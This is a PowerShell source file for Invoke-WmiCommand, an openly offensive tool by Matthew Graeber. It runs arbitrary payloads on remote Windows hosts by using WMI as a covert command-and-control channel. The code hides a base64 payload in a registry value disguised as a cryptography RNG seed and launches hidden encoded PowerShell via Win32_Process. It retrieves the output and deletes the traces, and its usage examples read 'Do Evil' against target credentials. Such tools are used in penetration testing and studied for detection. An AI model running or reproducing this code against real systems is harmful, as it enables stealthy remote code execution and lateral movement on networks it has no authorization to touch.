function Invoke-WmiCommand {
<#
.SYNOPSIS

Executes a PowerShell ScriptBlock on a target computer using WMI as a
pure C2 channel.

Author: Matthew Graeber
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Invoke-WmiCommand executes a PowerShell ScriptBlock on a target
computer using WMI as a pure C2 channel. It does this by using the
StdRegProv WMI registry provider methods to store a payload into a
registry value. The command is then executed on the victim system and
the output is stored in another registry value that is then retrieved
remotely.

.PARAMETER Payload

Specifies the payload to be executed on the remote system.

.PARAMETER RegistryKeyPath

Specifies the registry key where the payload and payload output will
be stored.

.PARAMETER RegistryPayloadValueName

Specifies the registry value name where the payload will be stored.

.PARAMETER RegistryResultValueName

Specifies the registry value name where the payload output will be
stored.

.PARAMETER ComputerName

Runs the command on the specified computers. The default is the local
computer.

Type the NetBIOS name, an IP address, or a fully qualified domain
name of one or more computers. To specify the local computer, type
the computer name, a dot (.), or "localhost".

This parameter does not rely on Windows PowerShell remoting. You can
use the ComputerName parameter even if your computer is not
configured to run remote commands.

.PARAMETER Credential

Specifies a user account that has permission to perform this action.
The default is the current user. Type a user name, such as "User01",
"Domain01\User01", or User@Contoso.com. Or, enter a PSCredential
object, such as an object that is returned by the Get-Credential
cmdlet. When you type a user name, you will be prompted for a
password.

.PARAMETER Impersonation

Specifies the impersonation level to use. Valid values are:

0: Default (Reads the local registry for the default impersonation level, which is usually set to "3: Impersonate".)

1: Anonymous (Hides the credentials of the caller.)

2: Identify (Allows objects to query the credentials of the caller.)

3: Impersonate (Allows objects to use the credentials of the caller.)

4: Delegate (Allows objects to permit other objects to use the credentials of the caller.)

.PARAMETER Authentication

Specifies the authentication level to be used with the WMI connection. Valid values are:

-1: Unchanged

0: Default

1: None (No authentication in performed.)

2: Connect (Authentication is performed only when the client establishes a relationship with the application.)

3: Call (Authentication is performed only at the beginning of each call when the application receives the request.)

4: Packet (Authentication is performed on all the data that is received from the client.)

5: PacketIntegrity (All the data that is transferred between the client  and the application is authenticated and verified.)

6: PacketPrivacy (The properties of the other authentication levels are used, and all the data is encrypted.)

.PARAMETER EnableAllPrivileges

Enables all the privileges of the current user before the command
makes the WMI call.

.PARAMETER Authority

Specifies the authority to use to authenticate the WMI connection.
You can specify standard NTLM or Kerberos authentication. To use
NTLM, set the authority setting to ntlmdomain:<DomainName>, where
<DomainName> identifies a valid NTLM domain name. To use Kerberos,
specify kerberos:<DomainName\ServerName>. You cannot include the
authority setting when you connect to the local computer.

.EXAMPLE

PS C:\>Invoke-WmiCommand -Payload { if ($True) { 'Do Evil' } } -Credential 'TargetDomain\TargetUser' -ComputerName '10.10.1.1'

.EXAMPLE

PS C:\>$Hosts = Get-Content hostnames.txt
PS C:\>$Payload = Get-Content payload.ps1
PS C:\>$Credential = Get-Credential 'TargetDomain\TargetUser'
PS C:\>$Hosts | Invoke-WmiCommand -Payload $Payload -Credential $Credential

.EXAMPLE

PS C:\>$Payload = Get-Content payload.ps1
PS C:\>Invoke-WmiCommand -Payload $Payload -Credential 'TargetDomain\TargetUser' -ComputerName '10.10.1.1', '10.10.1.2'

.EXAMPLE

PS C:/>Invoke-WmiCommand -Payload { 1+3+2+1+1 } -RegistryHive HKEY_LOCAL_MACHINE -RegistryKeyPath 'SOFTWARE\testkey' -RegistryPayloadValueName 'testvalue' -RegistryResultValueName 'testresult' -ComputerName '10.10.1.1' -Credential 'TargetHost\Administrator' -Verbose

.INPUTS

System.String[]

Accepts one or more host names/IP addresses over the pipeline.

.OUTPUTS

System.Management.Automation.PSObject

Outputs a custom object consisting of the target computer name and
the output of the command executed.

.NOTES

In order to receive the output from your payload, it must return
actual objects. For example, Write-Host doesn't return objects
rather, it writes directly to the console. If you're using
Write-Host in your scripts though, you probably don't deserve to get
the output of your payload back. :P
#>

    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $Payload,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $RegistryHive = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryKeyPath = 'SOFTWARE\Microsoft\Cryptography\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryPayloadValueName = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryResultValueName = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        switch ($RegistryHive) {
            'HKEY_LOCAL_MACHINE' { $Hive = 2147483650 }
            'HKEY_CURRENT_USER' { $Hive = 2147483649 }
            'HKEY_CLASSES_ROOT' { $Hive = 2147483648 }
            'HKEY_USERS' { $Hive = 2147483651 }
            'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
        }

        $HKEY_LOCAL_MACHINE = 2147483650

        $WmiMethodArgs = @{}

        # If additional WMI cmdlet properties were provided, proxy them to Invoke-WmiMethod
        if ($PSBoundParameters['Credential']) { $WmiMethodArgs['Credential'] = $Credential }
        if ($PSBoundParameters['Impersonation']) { $WmiMethodArgs['Impersonation'] = $Impersonation }
        if ($PSBoundParameters['Authentication']) { $WmiMethodArgs['Authentication'] = $Authentication }
        if ($PSBoundParameters['EnableAllPrivileges']) { $WmiMethodArgs['EnableAllPrivileges'] = $EnableAllPrivileges }
        if ($PSBoundParameters['Authority']) { $WmiMethodArgs['Authority'] = $Authority }

        $AccessPermissions = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }

        # These are all of the registry permissions we'll require
        $RequiredPermissions = $AccessPermissions['KEY_QUERY_VALUE'] -bor
                               $AccessPermissions['KEY_SET_VALUE'] -bor
                               $AccessPermissions['KEY_CREATE_SUB_KEY'] -bor
                               $AccessPermissions['KEY_CREATE'] -bor
                               $AccessPermissions['DELETE']
    }

    PROCESS {
        foreach ($Computer in $ComputerName) {
            # Pass the individual computer name to Invoke-WmiMethod
            $WmiMethodArgs['ComputerName'] = $Computer

            Write-Verbose "[$Computer] Creating the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList $Hive, $RegistryKeyPath

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to create the following registry key: $RegistryHive\$RegistryKeyPath"
            }

            Write-Verbose "[$Computer] Validating read/write/delete privileges for the following registry key: $RegistryHive\$RegistryKeyPath"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CheckAccess' -ArgumentList $Hive, $RegistryKeyPath, $RequiredPermissions

            if (-not $Result.bGranted) {
                throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
            }

            $PSSettingsPath = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
            $PSPathValueName = 'Path'

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$PSSettingsPath\$PSPathValueName"
            }

            $PowerShellPath = $Result.sValue
            Write-Verbose "[$Computer] Full PowerShell path: $PowerShellPath"

            $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

            Write-Verbose "[$Computer] Storing the payload into the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $EncodedPayload, $RegistryPayloadValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to store the payload in the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            # Prep the script runner payload from the remote system
            $PayloadRunnerArgs = @"
                `$Hive = '$Hive'
                `$RegistryKeyPath = '$RegistryKeyPath'
                `$RegistryPayloadValueName = '$RegistryPayloadValueName'
                `$RegistryResultValueName = '$RegistryResultValueName'
                `n
"@

            $RemotePayloadRunner = $PayloadRunnerArgs + {
                $WmiMethodArgs = @{
                    Namespace = 'Root\default'
                    Class = 'StdRegProv'
                }

                $Result = Invoke-WmiMethod @WmiMethodArgs -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName

                if (($Result.ReturnValue -eq 0) -and ($Result.sValue)) {
                    $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Result.sValue))

                    $TempSerializedResultPath = [IO.Path]::GetTempFileName()

                    $PayloadResult = Invoke-Expression ($Payload)

                    Export-Clixml -InputObject $PayloadResult -Path $TempSerializedResultPath

                    $SerilizedPayloadText = [IO.File]::ReadAllText($TempSerializedResultPath)

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadText, $RegistryResultValueName

                    Remove-Item -Path $SerilizedPayloadResult -Force

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName
                }
            }

            $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))

            $Cmdline = "$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"

            # Execute the payload runner on the remote system
            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline

            Start-Sleep -Seconds 5

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
            }

            Write-Verbose "[$Computer] Payload successfully executed from: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"

            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            if ($Result.ReturnValue -ne 0) {
                throw "[$Computer] Unable retrieve the payload results from the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            }

            Write-Verbose "[$Computer] Payload results successfully retrieved from: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"

            $SerilizedPayloadResult = $Result.sValue

            $TempSerializedResultPath = [IO.Path]::GetTempFileName()

            Out-File -InputObject $SerilizedPayloadResult -FilePath $TempSerializedResultPath
            $PayloadResult = Import-Clixml -Path $TempSerializedResultPath

            Remove-Item -Path $TempSerializedResultPath

            $FinalResult = New-Object PSObject -Property @{
                PSComputerName = $Computer
                PayloadOutput = $PayloadResult
            }

            Write-Verbose "[$Computer] Removing the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryResultValueName

            Write-Verbose "[$Computer] Removing the following registry key: $RegistryHive\$RegistryKeyPath"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteKey' -ArgumentList $Hive, $RegistryKeyPath

            return $FinalResult
        }
    }
}
